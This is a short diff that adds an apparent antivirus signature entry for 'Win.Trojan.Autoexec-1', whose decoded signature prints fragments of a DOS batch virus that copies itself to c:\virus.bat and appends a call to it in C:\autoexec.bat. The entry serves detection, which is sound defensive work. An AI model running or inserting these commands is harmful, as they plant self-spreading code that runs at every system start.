@@ -1,0 +1,7 @@
+VIRUS NAME: Win.Trojan.Autoexec-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+y nul
+copy %0 c:\virus.bat
+echo @call virus.bat >>C:\autoexec.bat
